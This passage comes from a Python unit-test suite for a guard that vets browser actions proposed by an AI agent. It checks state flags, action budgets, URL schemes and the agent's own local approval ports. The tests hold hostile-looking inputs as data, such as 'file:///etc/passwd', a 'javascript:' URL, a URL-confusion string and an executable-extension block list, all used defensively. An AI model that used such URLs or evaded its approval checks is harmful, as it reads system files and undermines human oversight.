        search = field(type="search")
        self.assertKind(facts("type", text="x" * 65, target=search), R.CLASSIFY)
        self.assertKind(facts("type", text="a\nb", target=search), R.CLASSIFY)
        self.assertKind(facts("type", text="hi", target=field()), R.CLASSIFY)
        self.assertKind(facts("type", text="hi", target=Element(tag="button", type="search")), R.CLASSIFY)
        self.assertKind(facts("select", text="Blue", target=Element(tag="select")), R.CLASSIFY)
        self.assertKind(facts("click", target=Element(tag="a", href="https://x.test/a")), R.CLASSIFY)
        self.assertKind(facts("navigate", nav_url="https://x.test/a"), R.CLASSIFY)

    def test_the_turn_budget_applies_to_judged_actions_only(self):
        self.assertRefused(facts("click", target=Element(tag="a"), judged_this_turn=40), "H10")
        self.assertKind(facts("click", target=Element(tag="a"), judged_this_turn=39), R.CLASSIFY)
        self.assertKind(facts("scroll", text="down", judged_this_turn=40), R.ALLOW)


# -- H3–H7, H9–H12: explicit facts -------------------------------------------------------------------------

class State(World):
    def test_the_suite_sets_every_state_fact(self):
        self.assertEqual(set(OK), set(R.STATE_FACTS))
        state = {name for name, f in Facts.__dataclass_fields__.items() if f.default is None}
        self.assertEqual(state - {"target", "form"}, set(R.STATE_FACTS))

    def test_nothing_filled_in_is_refused(self):
        for action in sorted(R.ACTIONS):
            with self.subTest(action=action):
                self.assertEqual(R.pre_judge(Facts(action)).kind, R.REFUSE)

    def test_every_fact_left_unset_refuses(self):
        allowed = [dict(action="scroll", text="down"),
                   dict(action="type", text="hi", target=field(type="search"))]
        for case in allowed:
            self.assertEqual(self.judge(Facts(**{**OK, **case})).kind, R.ALLOW)
            for name in R.STATE_FACTS:
                with self.subTest(action=case["action"], unset=name):
                    kw = {**OK, **case}
                    del kw[name]
                    self.assertEqual(self.judge(Facts(**kw)).kind, R.REFUSE)

    def test_only_explicit_values_pass(self):
        flags = [name for name in R.STATE_FACTS
                 if name not in ("owner_input_age_s", "judged_this_turn", "actions_this_hour", "depth")]
        counts = ["owner_input_age_s", "judged_this_turn", "actions_this_hour", "depth"]
        for name in flags:
            for wrong in ("no", "False", "True", "", 0, 1, 0.0, None, [], float("nan")):
                with self.subTest(fact=name, value=wrong):
                    self.assertEqual(self.judge(facts("scroll", **{name: wrong})).kind, R.REFUSE)
            if name not in ("owner_has_input", "private"):  # both values of these may pass
                with self.subTest(fact=name, value="flipped"):
                    self.assertEqual(self.judge(facts("scroll", **{name: not OK[name]})).kind, R.REFUSE)
        for name in counts:
            for wrong in ("0", "60", -1, -0.5, float("nan"), float("inf"), True, False, None, [0]):
                with self.subTest(fact=name, value=wrong):
                    self.assertEqual(self.judge(facts("scroll", **{name: wrong})).kind, R.REFUSE)

    def test_each_fact_refuses_alone(self):
        base = dict(target=field(type="search"), text="hi")
        cases = [(dict(at_desk=False), "H12", R.R_DESK), (dict(depth=1), "H12", R.R_DESK),
                 (dict(sub_agent=True), "H12", R.R_DESK), (dict(strict_profile=True), "H11", R.R_STRICT),
                 (dict(agents_may_drive=False), "H5", R.R_SWITCH_GLOBAL),
                 (dict(pane_can_see=False), "H5", R.R_SWITCH_SEE),
                 (dict(pane_can_drive=False), "H5", R.R_SWITCH_DRIVE),
                 (dict(private=True, pane_can_drive=False), "H5", R.R_SWITCH_PRIVATE),
                 (dict(tab_drawn=False), "H6", R.R_NOT_DRAWN), (dict(direct_mode=True), "H6", R.R_DIRECT),
                 (dict(card_pending=True), "H3", R.R_CARD), (dict(paused=True), "H4", R.R_PAUSED),
                 (dict(owner_input_age_s=1.0), "H4", R.R_OWNER_BUSY),
                 (dict(owner_input_age_s=0.0), "H4", R.R_OWNER_BUSY),
                 (dict(owner_input_age_s=float("nan")), "H4", R.R_OWNER_BUSY),
                 (dict(owner_input_age_s=-3.0), "H4", R.R_OWNER_BUSY),
                 (dict(url_refused=True), "H7", R.R_URL), (dict(other_driver=True), "H9", R.R_OTHER_DRIVER),
                 (dict(actions_this_hour=200), "H10", R.R_BUDGET_HOUR),
                 (dict(actions_this_hour=float("nan")), "H10", R.R_BUDGET_HOUR),
                 (dict(judged_this_turn=-1), "H10", R.R_BUDGET_TURN),
                 (dict(depth=float("nan")), "H12", R.R_DESK)]
        self.assertEqual(self.judge(facts("type", **base)).kind, R.ALLOW)
        for change, rule, reason in cases:
            with self.subTest(change=change):
                self.assertRefused(facts("type", **base, **change), rule, reason)
                self.assertRefused(facts("scroll", **change), rule, reason)

    def test_the_quiet_window_and_private_with_its_switch(self):
        self.assertEqual(self.judge(facts("scroll", owner_input_age_s=R.OWNER_QUIET_S)).kind, R.ALLOW)
        self.assertEqual(self.judge(facts("scroll", owner_has_input=False, owner_input_age_s=None)).kind,
                         R.ALLOW)
        self.assertEqual(self.judge(facts("scroll", private=True)).kind, R.ALLOW)

    def test_an_exception_while_judging_refuses(self):
        for f in (facts("type", text=None, target=field()),
                  facts("type", text="hi", target=field(label="Code", inputmode="numeric", maxlength="6")),
                  facts("press", key="Tab", target=field(single_char_siblings="many")),
                  facts("click", target="not an element"), "not facts", None):
            with self.subTest(f=repr(f)[:40]):
                verdict = R.pre_judge(f)
                self.assertEqual((verdict.kind, verdict.reason), (R.REFUSE, R.R_ERROR))
        self.assertEqual(R.pre_judge(facts("type", text="hi", target=field()), extra_values=object()).kind,
                         R.REFUSE)

    def test_actions_and_arguments(self):
        self.assertRefused(facts("eval", text="x"), "action", R.R_ACTION)
        self.assertRefused(facts("scroll", text="sideways"), "action", R.R_SCROLL)
        self.assertRefused(facts("type", text="x" * (R.MAX_TYPE_CHARS + 1), target=field()), "action",
                           R.R_TOO_LONG)

    def test_the_address_belt_under_the_url_judge(self):
        for url, reason in (("http://127.0.0.1:8405/approvals", R.R_JARVIS_PORT),
                            ("http://localhost:8402/", R.R_JARVIS_PORT), ("http://127.1:8405/", R.R_JARVIS_PORT),
                            ("javascript:alert(1)", R.R_SCHEME), ("file:///etc/passwd", R.R_SCHEME),
                            ("data:text/html,hi", R.R_SCHEME), ("about:blank", R.R_SCHEME),
                            ("example.com", R.R_SCHEME), ("http:///example.com", R.R_MALFORMED),
                            ("http://127.0.0.1:8405\\@example.com/", R.R_MALFORMED),
                            ("http://example.com:99999/", R.R_MALFORMED),
                            ("https://user:pw@example.com/", R.R_USERINFO),
                            ("https://example.com/" + "a" * R.MAX_NAV_URL, R.R_NAV_TOO_LONG)):
            with self.subTest(url=url[:60]):
                self.assertRefused(facts("navigate", nav_url=url), "H7", reason)
        self.assertKind(facts("navigate", nav_url="https://example.com/" + "a" * (R.MAX_NAV_URL - 20)),
                        R.CLASSIFY)

    def test_a_link_or_a_form_landing_on_jarvis(self):
        for url in ("http://localhost:8405/", "http://127.0.0.1:8405/approvals/x", "http://[::1]:8402/"):
            with self.subTest(url=url):
                self.assertRefused(facts("click", target=Element(tag="a", href=url)), "H7", R.R_JARVIS_PORT)
                form = Form("post", url, fields=(field(attr_name="q"),))
                self.assertRefused(facts("click", target=SUBMIT, form=form), "H7", R.R_JARVIS_PORT)
                self.assertRefused(facts("press", key="Enter", target=field(attr_name="q"), form=form),
                                   "H7", R.R_JARVIS_PORT)
                self.assertRefused(facts("press", key="Space", target=SUBMIT, form=form), "H7",
                                   R.R_JARVIS_PORT)

    def test_reasons_never_echo_page_text(self):
        marker = "PAGE-MARKER-31337"
        el = field(type="password", label=marker, name=marker, placeholder=marker)
        cases = [facts("type", text=marker, target=el, url=f"https://x.test/{marker}", title=marker),
                 facts("navigate", nav_url=f"javascript:{marker}"),
                 facts("upload", upload_path=marker, project_dir=str(self.project)),
                 facts("press", key=marker), facts("scroll", text=marker), facts(marker)]
        for f in cases:
            verdict = R.pre_judge(f)
            self.assertEqual(verdict.kind, R.REFUSE)
            self.assertIn(verdict.reason, REASONS)
            self.assertNotIn(marker, verdict.reason + verdict.rule + verdict.category)


# -- linear ------------------------------------------------------------------------------------------------

class Speed(World):
    def best(self, f: Facts) -> float:
        times = []
        for _ in range(3):
            start = time.perf_counter()
            R.pre_judge(f)
            times.append(time.perf_counter() - start)
        return min(times)

    def test_a_megabyte_label(self):
        R.words("\u00e9")  # the one-time table
        for label in ("Ab" * 500_000, "pass\u00e9 " * 170_000, "a b " * 250_000, "otp" * 333_333,
                      "x" * 999_999 + "!", "\u200b" * 1_000_000, "1a" * 500_000):
            with self.subTest(label=label[:8]):
                el = field(label=label, placeholder=label[:1000])
                for f in (facts("type", text="hi", target=el), facts("press", key="Tab", target=el)):
                    seconds = self.best(f)
                    self.assertLess(seconds, 0.1, f"{seconds * 1000:.1f} ms")

    def test_a_long_address(self):
        for url in ("https://example.com/" + "a/" * 50_000, "https://example.com/" + "a" * 100_000,
                    "https://example.com/?" + "%41" * 33_000, "https://example.com/" + "a/" * 49_990 + "login",
                    "https://example.com/" + "login/" * 16_000 + "x.exe",
                    "https://example.com/?" + "route=a/b&" * 10_000, "https://example.com/#/" + "x/" * 50_000,
                    "https://" + "a." * 50_000 + "com/"):
            with self.subTest(url=url[-20:]):
                for f in (facts("navigate", nav_url=url), facts("click", target=Element(tag="a", href=url))):
                    seconds = self.best(f)
                    self.assertLess(seconds, 0.1, f"{seconds * 1000:.1f} ms")


class Tables(World):
    def test_the_tables_hold_what_the_plan_names(self):
        for ext in (".exe", ".msi", ".bat", ".cmd", ".ps1", ".sh", ".deb", ".rpm", ".appimage", ".dmg",
                    ".pkg", ".jar", ".apk", ".scr", ".hta", ".lnk", ".iso", ".reg", ".msp", ".application"):
            self.assertIn(ext, R.EXECUTABLE_EXTENSIONS)
        for host in ("stripe.com", "braintreegateway.com", "adyen.com", "paypal.com", "squareup.com"):
            self.assertIn(host, R.PAYMENT_FRAME_HOSTS)
        self.assertEqual(R.NAV_KEYS & R.JUDGED_KEYS, set())
        self.assertEqual(set(R.CATEGORIES) - R.SENSITIVE, {R.ORDINARY})
        for name in ("Element", "Form", "Facts"):
            fields = set(getattr(R, name).__dataclass_fields__)
            self.assertFalse(fields & {"value", "values", "default_value", "checked"}, name)


if __name__ == "__main__":
    unittest.main(verbosity=1)
